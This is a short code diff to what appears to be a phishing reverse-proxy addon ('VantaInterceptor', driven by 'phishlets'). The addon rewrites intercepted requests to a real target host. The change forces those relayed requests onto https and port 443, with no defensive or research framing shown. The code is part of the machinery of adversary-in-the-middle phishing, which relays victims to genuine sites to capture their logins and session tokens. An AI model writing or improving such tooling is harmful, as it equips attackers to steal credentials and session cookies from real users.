@@ -101,6 +101,14 @@ class VantaInterceptor:
             try:
                 first = next(iter(self.phishlet.proxy_hosts))
                 flow.request.host = first.target
+                try:
+                    flow.request.scheme = "https"
+                except Exception:
+                    pass
+                try:
+                    flow.request.port = 443
+                except Exception:
+                    pass
                 if not hasattr(flow, "metadata"):
                     flow.metadata = {}
                 flow.metadata["v_ph_host"] = host
@@ -139,6 +147,14 @@ class VantaInterceptor:
                             new_path = "/" + new_path
                         flow.request.path = new_path
                         flow.request.host = br.target_host
+                        try:
+                            flow.request.scheme = "https"
+                        except Exception:
+                            pass
+                        try:
+                            flow.request.port = 443
+                        except Exception:
+                            pass
                         try:
                             oh = br.origin_host or br.target_host
                             flow.request.headers["origin"] = f"https://{oh}"
